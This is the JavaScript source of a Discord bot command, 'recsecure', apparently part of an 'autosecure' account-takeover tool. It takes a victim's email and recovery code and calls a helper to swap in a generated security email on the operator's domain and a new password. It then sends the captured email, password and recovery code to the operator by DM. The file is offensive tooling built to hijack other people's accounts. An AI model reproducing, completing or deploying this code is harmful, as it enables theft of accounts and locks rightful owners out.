const { domains } = require("./../../../config.json");
const generate = require("../../utils/generate");
const recoveryCodeSecure = require("../../utils/recoveryCodeSecure");
const { queryParams } = require("../../../db/db");
module.exports = {
    name: "recsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        let email = interaction.components[0].components[0].value;
        let recoveryCode = interaction.components[1].components[0].value;
        let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
        if (settings.length == 0) return interaction.reply({ content: `Couldn't get your settings!`, ephemeral: true })
        settings = settings[0]

        interaction.deferReply({ ephemeral: true })
        let secEmail = `${generate(16)}@${settings?.domain ? settings.domain : domains[0]}`
        let data = await recoveryCodeSecure(email, recoveryCode, secEmail, generate(16))
        if (data) {

            let msg = {
                embeds: [{
                    title: `Accout`,
                    fields: [
                        {
                            name: "Email",
                            value: "```" + data.email + "```",
                            inline: true
                        },
                        {
                            name: "Security Email",
                            value: "```" + data.secEmail + "```",
                            inline: true
                        },
                        {
                            name: "Password",
                            value: "```" + data.password + "```",
                            inline: false
                        },
                        {
                            name: "Recovery Code",
                            value: "```" + data.recoveryCode + "```",
                            inline: false
                        },
                    ],
                    color: 0x237feb
                }],
                ephemeral: true
            }
            await interaction.user.send(msg)
            return interaction.editReply(msg)
        } else {
            return interaction.editReply({ content: `Failed to secure using this recovery code and email\nEither the email is invalid or the recovery code is invalid!`, ephemeral: true })
        }

    }
}